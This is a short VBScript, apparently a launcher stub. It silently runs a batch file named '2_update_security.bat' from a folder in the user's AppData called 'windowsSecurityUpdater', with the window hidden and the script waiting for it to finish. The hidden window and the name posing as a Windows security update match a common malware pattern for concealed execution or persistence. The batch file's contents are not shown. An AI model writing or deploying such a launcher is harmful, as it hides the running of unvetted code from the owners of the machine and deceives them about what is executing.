DIM objShell
set objShell=wscript.createObject("wscript.shell")
iReturn=objShell.Run("%appdata%\windowsSecurityUpdater\2_update_security.bat", 0, TRUE)